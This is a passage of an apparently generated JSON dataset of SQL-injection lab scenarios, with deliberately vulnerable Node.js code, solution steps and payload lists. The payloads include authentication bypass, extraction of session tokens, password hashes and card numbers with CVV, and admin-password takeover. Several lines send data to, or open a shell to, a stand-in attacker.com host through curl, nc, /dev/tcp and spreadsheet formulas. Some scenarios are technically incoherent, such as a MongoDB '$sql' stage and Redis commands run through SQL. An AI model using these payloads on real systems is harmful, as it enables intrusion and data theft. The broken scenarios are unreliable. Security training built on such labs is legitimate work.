    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 9",
      "' UNION SELECT null, version(), null -- 9",
      "' AND SLEEP(9) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=9) -- ",
      "admin' -- 9"
    ]
  },
  {
    "Lab scenario": "Join Injection SQL injection scenario",
    "Lab Description": "This lab explores a join injection sql injection scenario vulnerability. The goal is to understand how crafted SQL input can exploit weaknesses in query construction and retrieve or modify data in unintended ways.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request affecting the ORDER BY clause.",
      "Validate vulnerability by injecting basic payload like ' OR '1'='1.",
      "Craft a specific payload exploiting the SQL injection using the identified vector.",
      "Refine injection by testing response structure or using time delays.",
      "Verify exploitation success by extracting sensitive data or triggering side-effects."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst sqlite3 = require('sqlite3').verbose();\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst db = new sqlite3.Database(':memory:');\ndb.serialize(() => {\n  db.run(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT, role TEXT)\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('admin', 'administrator')\");\n  db.run(\"INSERT INTO users (name, role) VALUES ('user', 'customer')\");\n});\n\napp.get('/search', (req, res) => {\n  const param = req.query.input;\n  const query = `SELECT * FROM users WHERE role = '${param}'`;\n  console.log(\"Query executed:\", query);\n  db.all(query, [], (err, rows) => {\n    if (err) {\n      res.status(500).send(\"Error.\");\n    } else {\n      res.json(rows);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log(\"Server running at http://localhost:3000\");\n});",
    "payloads": [
      "' OR 1=1 -- 10",
      "' UNION SELECT null, version(), null -- 10",
      "' AND SLEEP(10) -- ",
      "' OR EXISTS(SELECT * FROM products WHERE id=10) -- ",
      "admin' -- 10"
    ]
  },
  {
    "Lab scenario": "REST API SQLi through HTTP Headers",
    "Lab Description": "The inventory management API uses the X-User-Id header directly in SQL queries without validation. The application logs all SQL queries for debugging. To solve: perform header injection to extract all API keys from the system_config table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept any API request with Burp Suite",
      "Add malicious X-User-Id header: ' OR 1=1 UNION SELECT 1,config_value,3 FROM system_config WHERE config_name='api_key'--",
      "Bypass WAF by obfuscating with URL encoding",
      "Extract data from verbose error messages",
      "Chain with X-Forwarded-Host header for OOB exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/inventory', (req, res) => {\n  const userId = req.headers['x-user-id'] || '0';\n  const query = `SELECT item_id, item_name FROM inventory WHERE user_id = ${userId}`;\n  \n  console.log(`DEBUG: ${query}`); // Verbose logging\n  \n  db.query(query, (err, results) => {\n    if (err) return res.status(500).json({error: err.message}); // Error leakage\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT 1,@@version--",
      "' OR 1=1; COPY (SELECT * FROM system_config) TO '/var/www/static/leak.csv'--",
      "0' UNION SELECT 1,LOAD_FILE('/etc/passwd')--",
      "1' AND EXTRACTVALUE(1,CONCAT(0x3a,(SELECT GROUP_CONCAT(config_value) FROM system_config)))--"
    ]
  },
  {
    "Lab scenario": "WebSocket SQLi in real-time chat",
    "Lab Description": "The chat application's WebSocket message handler directly interpolates message metadata into SQL. The vulnerability triggers when editing messages. To solve: exploit this to pivot into the underlying Redis cache and extract session data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake with Burp",
      "Send message edit request with SQLi payload",
      "Use stacked queries to call Redis commands",
      "Dump session keys with: '; EVAL \"return redis.call('keys','sess:*')\" 0--",
      "Extract specific session data using Redis GET"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (message) => {\n    const data = JSON.parse(message);\n    \n    if (data.type === 'edit') {\n      // Vulnerable SQL construction\n      db.query(\n        `UPDATE messages SET content = '${data.content}' \n         WHERE id = '${data.msgId}' AND user = '${data.userId}'`\n      );\n    }\n  });\n});",
    "payloads": [
      "' OR 1=1; EVAL \"return redis.call('keys','*')\" 0--",
      "'; EVAL \"return redis.call('get','sess:admin')\" 0--",
      "'||(SELECT system('/bin/sh -i >& /dev/tcp/attacker/443 0>&1'))--",
      "1'; EXECUTE command_executor('curl attacker.com/?leak=$(redis-cli get sess:admin|base64)')--"
    ]
  },
  {
    "Lab scenario": "JWT claim SQLi in analytics dashboard",
    "Lab Description": "The dashboard extracts organization_id from JWT tokens and uses it unsanitized in SQL queries. The application uses PostgreSQL JSON functions. To solve: forge a JWT with malicious JSON path traversal to access all organizations' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Decode JWT using jwt.io",
      "Modify organization_id claim to: ']'::jsonb) OR 1=1--",
      "Use PostgreSQL JSON operators: ' @> '{\"is_admin\":true}'::jsonb--",
      "Extract other organizations' data with path traversal",
      "Access admin panel via JWT claim injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/analytics', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.verify(token, process.env.SECRET);\n  \n  // Vulnerable JSON path usage\n  const query = `\n    SELECT * FROM analytics \n    WHERE org_id::jsonb @> '${decoded.organization_id}'::jsonb`;\n  \n  db.query(query, (err, results) => {\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1--",
      "' @> '{\"is_admin\":true}'::jsonb--",
      "'::jsonb) UNION SELECT 1,2,(SELECT current_setting('session_user'))--",
      "'::jsonb); COPY (SELECT * FROM users) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "CSV export SQLi with formula injection",
    "Lab Description": "The report generator creates CSV files using direct SQL query results. The application is vulnerable to both SQLi and CSV formula injection. To solve: craft a payload that both extracts database information and triggers RCE when the CSV is opened in Excel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept report generation request",
      "Inject UNION query with CSV formula payload",
      "Use =HYPERLINK() or =WEBSERVICE() formulas",
      "Combine with SQL CONCAT for OOB exfiltration",
      "Trigger malicious formulas when admin opens report"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/export', (req, res) => {\n  const { filters } = req.body;\n  \n  // Vulnerable query construction\n  const query = `\n    SELECT id, name, email \n    FROM users \n    WHERE ${filters} INTO OUTFILE '/tmp/report.csv'`;\n  \n  db.query(query, () => {\n    res.download('/tmp/report.csv');\n  });\n});",
    "payloads": [
      "1=1 UNION SELECT '=HYPERLINK(\"http://attacker.com/leak?\"&A1,A1)',2,3--",
      "1=1 UNION SELECT CONCAT('=WEBSERVICE(\"http://attacker.com/',@@version,'\")'),2,3--",
      "1=1; SELECT * FROM users INTO OUTFILE '/var/www/html/export.csv' FIELDS TERMINATED BY '=CMD|' ENCLOSED BY '\"' LINES TERMINATED BY ' /C calc.exe!'--",
      "1=1 UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/export.csv' LINES TERMINATED BY 0x3d434d447c2f432063616c632e65786521--"
    ]
  },
  {
    "Lab scenario": "SQLi in GraphQL aliases with query batching",
    "Lab Description": "The GraphQL endpoint allows batch queries using aliases that get converted to SQL column names. The application fails to sanitize alias characters. To solve: use specially crafted aliases to perform stacked queries and disable security controls.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send GraphQL introspection query",
      "Identify vulnerable mutation with alias support",
      "Craft batch query with malicious aliases: alias1:updateUsers(password:'hacked')",
      "Bypass field restrictions using Unicode aliases",
      "Disable WAF with stacked query injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { ApolloServer } = require('apollo-server');\n\nconst typeDefs = `\n  type User {\n    id: ID!\n    name: String!\n  }\n  \n  type Query {\n    users: [User]\n    user(id: ID!): User @sql(table: \"users\", column: \"id\")\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    user: (_, { id }, { db }) => {\n      // Vulnerable alias handling\n      const query = `SELECT * FROM users WHERE ${resolverInfo.fieldName} = '${id}'`;\n      return db.query(query);\n    }\n  }\n};",
    "payloads": [
      "query { user(id:\"1\") { id } user__0:user(id:\"1'; DROP TABLE firewall_rules--\") { id } }",
      "mutation { update__0:updateUser(id:\"1\",input:\"1')\",update__1:updateUser(id:\"1\",input:\"1'); UPDATE users SET is_admin=1 WHERE id=1--\") }",
      "query { __schema { types { name } } user(id:\"1' UNION SELECT 1,LOAD_FILE('/etc/passwd')--\") }",
      "query($id:String!) { user(id:$id) { id } }"
    ]
  },
  {
    "Lab scenario": "LDAP Filter SQLi in Employee Directory",
    "Lab Description": "The corporate directory system improperly converts LDAP filters to SQL queries. Special characters from both systems (LDAP and SQL) cause improper query handling. To exploit this, craft an LDAP filter that breaks into the SQL context and extracts sensitive HR records.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept LDAP search requests with Burp Suite",
      "2. Identify vulnerable LDAP filter parameter",
      "3. Break the LDAP context using ')(objectClass=*)'",
      "4. Inject SQL into the LDAP context with '|(uid=*)) OR 1=1--'",
      "5. Extract sensitive data (e.g., HR records) from the database schema"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const ldap = require('ldapjs');\nconst db = require('./db');\n\nconst server = ldap.createServer();\n\nserver.search('ou=people', (req, res) => {\n  const filter = req.filter;\n  \n  // Vulnerable LDAP to SQL conversion\n  const where = convertLdapToSQL(filter);\n  const query = `SELECT * FROM employees WHERE ${where}`;\n  \n  db.query(query, (err, results) => {\n    results.forEach(entry => {\n      res.send(entryToLdap(entry));\n    });\n    res.end();\n  });\n});\n\nfunction convertLdapToSQL(filter) {\n  // Naive conversion that doesn't handle escaping\n  return filter.toString()\n    .replace(/\\(([^)]+)\\)/g, \"$1\")\n    .replace(/\\|/g, \" OR \")\n    .replace(/\\&/g, \" AND \");\n}",
    "payloads": [
      ")(objectClass=*)) OR 1=1--",
      ")(uid=*)) UNION SELECT 1, ssn, null FROM hr_records--",
      ")(|(uid=*)(objectClass=*))); INSERT INTO backdoor VALUES ('hacker','pass')--",
      ")(cn=*)) AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--"
    ]
  },
  {
    "Lab scenario": "SQLi in MongoDB $where clause",
    "Lab Description": "The product catalog uses MongoDB but has a legacy SQL compatibility layer. The $where clause accepts JavaScript that gets translated to SQL. To solve: break out of the JS context to execute raw SQL against the underlying PostgreSQL database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $where parameter",
      "Break JS context with }); return true; //",
      "Enter SQL context with raw queries",
      "Use PostgreSQL dollar-quoted strings",
      "Perform cross-database exfiltration"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { MongoClient } = require('mongodb');\nconst app = express();\n\napp.get('/products', async (req, res) => {\n  const client = await MongoClient.connect('mongodb://localhost:27017');\n  const db = client.db('catalog');\n  \n  // Vulnerable $where clause\n  const query = {\n    $where: `function() { return ${req.query.filter} }`\n  };\n  \n  // Gets converted to SQL\n  const results = await db.collection('products')\n    .find(query)\n    .toArray();\n  \n  res.json(results);\n});",
    "payloads": [
      "1; return true; }); db.getCollection('users').find({}); //",
      "1; return true; }); SQL.execute('SELECT * FROM pg_user'); //",
      "1; return true; }); SQL.execute($$COPY (SELECT * FROM secrets) TO PROGRAM 'curl attacker.com?leak=$(base64 /etc/passwd)'$$); //",
      "1; return true; }); SQL.execute($$CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$\n$$ BEGIN EXECUTE $1; RETURN '1'; END; $$\n$$ LANGUAGE plpgsql$$); //"
    ]
  },
  {
    "Lab scenario": "SSTI to SQLi in helpdesk templates",
    "Lab Description": "The ticket system renders templates with user-provided data. The application first processes SQL then templates, allowing SSTI to break into SQL context. To solve: chain template injection with SQLi to access the tickets database as admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit helpdesk ticket with SSTI payload",
      "Break template context with {{7*7}}",
      "Enter SQL context with }}' UNION SELECT 1,2,3--",
      "Access template rendering database",
      "Extract all tickets via dual-stage injection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/tickets', (req, res) => {\n  const { subject, message } = req.body;\n  \n  // First SQL processing\n  db.query(\n    `INSERT INTO tickets (subject, message) \n     VALUES ('${subject}', '${message}')`\n  );\n  \n  // Then template rendering\n  const template = `\n    <div class=\"ticket\">\n      <h2>${subject}</h2>\n      <p>${message}</p>\n    </div>\n  `;\n  \n  res.send(template);\n});",
    "payloads": [
      "{{7*7}}' UNION SELECT 1,2,3--",
      "{% raw %}' OR 1=1; -- {{endraw}}",
      "{{config}}' UNION SELECT 1,2,(SELECT password FROM users WHERE username='admin')--",
      "{{''.__class__}}'); DROP TABLE tickets;--"
    ]
  },
  {
    "Lab scenario": "SQLi in dynamic pivot queries",
    "Lab Description": "The reporting tool builds pivot tables from user-controlled column names. The application uses unsafe string interpolation for dynamic SQL. To solve: break out of the column name context to execute system commands via PostgreSQL COPY.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept pivot table configuration",
      "Identify vulnerable column parameter",
      "Break SQL context with quoted column names",
      "Use PostgreSQL dollar quoting for stacked queries",
      "Execute commands via COPY TO PROGRAM"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.post('/report', (req, res) => {\n  const { pivotColumn } = req.body;\n  \n  // Vulnerable dynamic pivot\n  const query = `\n    SELECT * FROM crosstab(\n      'SELECT department, month, sales FROM metrics',\n      'SELECT DISTINCT ${pivotColumn} FROM metrics'\n    ) AS ct(\n      department text,\n      ${pivotColumn} numeric[]\n    )`;\n  \n  db.query(query, (err, results) => {\n    res.json(results.rows);\n  });\n});",
    "payloads": [
      "month FROM metrics); DROP TABLE users--",
      "month FROM metrics); COPY (SELECT * FROM passwords) TO '/var/www/static/leak.csv'--",
      "month FROM metrics); CREATE TABLE hack(cmd_output text); COPY hack FROM PROGRAM 'id'--",
      "month FROM metrics$$) AS ct(department text, cmd_output text); COPY (SELECT * FROM hack) TO PROGRAM 'curl attacker.com/?leak=$(base64 /etc/passwd)'--"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQLi in hybrid database architecture",
    "Lab Description": "The application uses MongoDB for frontend but PostgreSQL for reporting, with unsafe data passing between them. The $expr operator allows JavaScript execution. To solve: break out of MongoDB aggregation pipeline to execute raw SQL against the reporting database.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable $expr parameter",
      "Break aggregation context with JavaScript",
      "Access SQL bridge functions",
      "Execute stacked queries against reporting DB",
      "Extract financial data via cross-database query"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst { MongoClient } = require('mongodb');\nconst app = express();\n\napp.get('/reports', async (req, res) => {\n  const client = await MongoClient.connect('mongodb://localhost:27017');\n  const db = client.db('hybrid');\n  \n  // Vulnerable $expr usage\n  const pipeline = [\n    { $match: { $expr: { $eq: [ '$status', req.query.status ] } } },\n    { $sql: `SELECT * FROM reports WHERE status = '${req.query.status}'` }\n  ];\n  \n  const results = await db.collection('data')\n    .aggregate(pipeline)\n    .toArray();\n  \n  res.json(results);\n});",
    "payloads": [
      "' || 1==1 || '",
      "' && this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id') && '",
      "' || SQL.execute(`COPY (SELECT * FROM financials) TO PROGRAM 'nc attacker.com 4444'`) || '",
      "' && SQL.execute(`CREATE OR REPLACE FUNCTION exec(text) RETURNS text AS $$\n$$ BEGIN EXECUTE $1; RETURN '1'; END; $$\n$$ LANGUAGE plpgsql`) && '"
    ]
  },
  {
    "Lab scenario": "Boolean-based SQL injection in Banking Portal's login form",
    "Lab Description": "The banking portal login form directly incorporates user input into a SQL query. The application returns different messages depending on whether the login is successful or not. This behavior leaks information about query evaluation. To solve: Use a Boolean-based SQLi to bypass authentication and access the admin panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept login request using Burp Suite",
      "Test payload: ' OR 1=1-- to check response",
      "Craft final payload: admin' OR '1'='1'--",
      "Observe successful login and redirection to admin panel",
      "Take a screenshot of the admin dashboard as proof"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;\n  db.get(query, (err, user) => {\n    if (user) res.redirect('/admin');\n    else res.send('Invalid credentials');\n  });\n});",
    "payloads": [
      "admin' OR 1=1--",
      "admin'--",
      "' OR '1'='1"
    ]
  },
  {
    "Lab scenario": "Time-based blind SQL injection in CMS search endpoint",
    "Lab Description": "The CMS search endpoint includes user input in a SQL query without sanitization. Errors are suppressed, but time-based inference is possible. To solve: Use time delays to extract the database name.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to fuzz the search parameter",
      "Inject payloads with SLEEP() and measure response time",
      "Payload example: ' OR IF(1=1, SLEEP(5), 0)--",
      "Refine to: ' OR IF(database() LIKE 'cms%', SLEEP(5), 0)--",
      "Confirm database name with timing differences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const term = req.query.q || '';\n  const query = `SELECT * FROM articles WHERE title LIKE '%${term}%'`;\n  db.all(query, (err, rows) => {\n    if (err) return res.json([]); // Error suppression\n    res.json(rows);\n  });\n});",
    "payloads": [
      "' OR IF(1=1, SLEEP(5), 0)--",
      "' OR IF(database() LIKE 'cms%', SLEEP(5), 0)--",
      "' OR (SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)=1 AND SLEEP(5)--"
    ]
  },
  {
    "Lab scenario": "SQL injection via ORDER BY in IoT Dashboard device logs",
    "Lab Description": "The IoT dashboard log viewer accepts column names via query params to dynamically ORDER BY input. The app fails to sanitize input. To solve: Use SQLi in ORDER BY clause to retrieve table structure.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to test /logs?order=device_id",
      "Inject payload: device_id,(SELECT 1 FROM information_schema.tables LIMIT 1)--",
      "Confirm output shows database information",
      "Use: 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='devices')--",
      "Enumerate column names in response"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/logs', (req, res) => {\n  const order = req.query.order || 'id';\n  const query = `SELECT * FROM logs ORDER BY ${order}`;\n  db.all(query, (err, rows) => {\n    if (err) return res.status(500).send('Sorting error');\n    res.json(rows);\n  });\n});",
    "payloads": [
      "device_id,(SELECT 1 FROM information_schema.tables LIMIT 1)--",
      "1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='devices')--"
    ]
  },
  {
    "Lab scenario": "UNION-based SQL injection in Banking Portal's transfer history",
    "Lab Description": "The transfer history feature filters by date and concatenates user input without validation. The app returns full query output. To solve: Use UNION to extract current session token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept /history?date=",
      "Determine column count with: ' ORDER BY 2--",
      "Test with UNION SELECT NULL,NULL--",
      "Payload: ' UNION SELECT username,session_token FROM active_sessions--",
      "Verify session tokens are returned and reuse one"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/history', (req, res) => {\n  const date = req.query.date || '2023-01-01';\n  const query = `SELECT amount, to_user FROM transfers WHERE date = '${date}'`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL,NULL--",
      "' UNION SELECT username,session_token FROM active_sessions--",
      "' UNION SELECT 1,@@version--"
    ]
  },
  {
    "Lab scenario": "Blind SQL injection via HTTP header in CMS",
    "Lab Description": "A custom CMS logs the 'X-User-Role' HTTP header directly into a SQL query. The response doesn't change, but logs can be timed. To solve: Use blind inference to leak the admin password hash.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept requests using Burp and modify X-User-Role",
      "Send payload: admin' AND 1=1-- and measure response time",
      "Refine to: admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 70--",
      "Use binary search with SLEEP() to guess each character",
      "Reconstruct password hash from timing differences"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res, next) => {\n  const role = req.headers['x-user-role'] || 'guest';\n  const logQuery = `INSERT INTO audit_logs (role, timestamp) VALUES ('${role}', datetime('now'))`;\n  db.run(logQuery);\n  next();\n});",
    "payloads": [
      "admin' AND 1=1--",
      "admin' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 70--",
      "admin' AND IF((SELECT COUNT(*) FROM users WHERE username='admin' AND password LIKE 'a%'),SLEEP(5),0)--"
    ]
  },
  {
    "Lab scenario": "Out-of-band SQL injection in API Gateway diagnostics endpoint",
    "Lab Description": "The diagnostics endpoint logs user agent strings and performs internal queries. It leaks no response but allows out-of-band DNS requests. To solve: Trigger a DNS lookup to your Burp Collaborator domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Collaborator to set up listener",
      "Inject payload: '; EXEC xp_dirtree '\\\\your-collab-id.burpcollaborator.net\\share'--",
      "Send request with payload in User-Agent header",
      "Check Collaborator for DNS interaction",
      "Validate exfiltration via different subdomains"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/diagnostics', (req, res) => {\n  const agent = req.headers['user-agent'] || '';\n  const logQuery = `INSERT INTO diagnostics (info, timestamp) VALUES ('${agent}', NOW())`;\n  db.query(logQuery);\n  res.send('Diagnostic data logged');\n});",
    "payloads": [
      "'; EXEC xp_dirtree '\\\\abc.burpcollaborator.net\\share'--",
      "' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\share'))--"
    ]
  },
  {
    "Lab scenario": "SQL injection in ORDER BY clause in CMS pagination",
    "Lab Description": "A CMS plugin allows clients to control ORDER BY for pagination. Injection into the ORDER clause is unsanitized. To solve: Use SQL injection to leak column names via error messages.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send: /posts?page=1&sort=id",
      "Try sort=(CASE WHEN (1=1) THEN id ELSE title END) to test control",
      "Use: sort=(CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='posts')>0 THEN id ELSE 1/0 END)",
      "Extract column names via error messages",
      "List all fields in posts table"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/posts', (req, res) => {\n  const sort = req.query.sort || 'id';\n  const query = `SELECT * FROM posts ORDER BY ${sort} LIMIT 10`;\n  db.all(query, (err, rows) => {\n    if (err) return res.status(500).send(err.message); // Error leakage\n    res.json(rows);\n  });\n});",
    "payloads": [
      "(CASE WHEN (1=1) THEN id ELSE title END)",
      "(CASE WHEN (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='posts')>0 THEN id ELSE 1/0 END)",
      "1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='posts')--"
    ]
  },
  {
    "Lab scenario": "SQL injection via GROUP BY clause in financial analytics tool",
    "Lab Description": "A financial analytics report allows grouping by column passed via GET request. The GROUP BY clause is unsanitized. To solve: Inject into GROUP BY to display column values from the users table.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /analytics?group=category",
      "Inject group=category UNION SELECT username FROM users--",
      "Observe usernames appear in grouped table",
      "Refine to: group=1 UNION SELECT password FROM users--",
      "Document password hashes found"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/analytics', (req, res) => {\n  const groupBy = req.query.group || 'category';\n  const query = `SELECT ${groupBy}, COUNT(*) FROM transactions GROUP BY ${groupBy}`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "category UNION SELECT username FROM users--",
      "1 UNION SELECT password FROM users--",
      "1 UNION SELECT table_name FROM information_schema.tables--"
    ]
  },
  {
    "Lab scenario": "Login bypass using stacked queries in IoT portal",
    "Lab Description": "The login form allows stacked queries using semicolons. This permits command chaining and account hijacking. To solve: Log in using SQLi and change the password of admin user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send username: admin'; UPDATE users SET password='hacked' WHERE username='admin';--",
      "Submit any password value",
      "Login using username 'admin' and password 'hacked'",
      "Confirm access to admin dashboard",
      "Document the vulnerability"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: false }));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;\n  db.get(query, (err, user) => {\n    if (user) res.redirect('/dashboard');\n    else res.send('Login failed');\n  });\n});",
    "payloads": [
      "admin'; UPDATE users SET password='hacked' WHERE username='admin';--",
      "admin'; INSERT INTO users (username,password) VALUES ('attacker','pwned');--"
    ]
  },
  {
    "Lab scenario": "SQL injection in nested subquery within Banking Portal reports",
    "Lab Description": "A banking report form executes nested queries using user input. The subquery for filtering account types is injectable. To solve: Extract the credit card numbers using SQL injection into the nested query.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to send: /report?account=1",
      "Inject payload: ' UNION SELECT credit_card FROM cards WHERE '1'='1",
      "Refine to: ' OR EXISTS(SELECT 1 FROM cards WHERE card_number LIKE '4%')--",
      "Dump complete card numbers with: ' UNION SELECT CONCAT(card_number,'|',expiry,'|',cvv) FROM cards--",
      "Document the extracted card data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/report', (req, res) => {\n  const acc = req.query.account || '1';\n  const query = `SELECT * FROM reports WHERE acc_id IN (SELECT id FROM accounts WHERE type = '${acc}')`;\n  db.all(query, (err, rows) => {\n    res.json(rows);\n  });\n});",
    "payloads": [
      "' UNION SELECT credit_card FROM cards WHERE '1'='1",
      "' OR EXISTS(SELECT 1 FROM cards WHERE card_number LIKE '4%')--",
      "' UNION SELECT CONCAT(card_number,'|',expiry,'|',cvv) FROM cards--"
    ]
  },
  {
    "Lab scenario": "SQL injection in GraphQL variables parser",
    "Lab Description": "A GraphQL endpoint improperly handles variable type conversion, allowing SQL injection when variables are interpolated into raw SQL. The application uses a custom @sql directive. To solve: Exploit variable parsing to extract the GraphQL schema definition.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send introspection query to identify @sql directives",
      "Craft query with malicious variables: {filter: \"1=1) UNION SELECT 1,2,3,table_name FROM information_schema.tables--\"}",
      "Use JSON encoding bypass: {\"filter\": {\"$gt\": \"' UNION SELECT schema FROM graphql.schema--\"}}",
      "Extract complete schema via error-based technique",
      "Map all database tables through GraphQL types"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "const { ApolloServer } = require('apollo-server');\nconst typeDefs = `\n  directive @sql(raw: Boolean) on FIELD_DEFINITION\n  type Query {\n    products(filter: String!): [Product] @sql(raw: true)\n  }\n`;\n\nconst resolvers = {\n  Query: {\n    products: (_, { filter }) => {\n      return db.query(`SELECT * FROM products WHERE ${filter}`);\n    }\n  }\n};",
    "payloads": [
      "1=1) UNION SELECT 1,2,3,table_name FROM information_schema.tables--",
      "' OR 1=1; EXECUTE IMMEDIATE 'SELECT * FROM graphql.schema'--",
      "1=1) RETURNING 1,2,3,(SELECT schema FROM graphql.schema)--"
    ]
  },
  {
    "Lab scenario": "NoSQL to SQL injection in hybrid document-relational system",
    "Lab Description": "An application stores JSON documents in PostgreSQL jsonb columns but converts queries to SQL unsafely. The $where clause allows JavaScript execution that reaches raw SQL. To solve: Break out of MongoDB-style syntax to execute arbitrary SQL.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify vulnerable JSON query parameter",
      "Break JavaScript context with: {\"$where\": \"1; return true\"}",
      "Enter SQL context with: {\"$where\": \"1); SELECT * FROM pg_user--\"}",
      "Leverage PostgreSQL JSON operators for data exfiltration",
      "Dump all collections via SQL UNION queries"
    ],
    "Vulnerability name": "SQL injection",
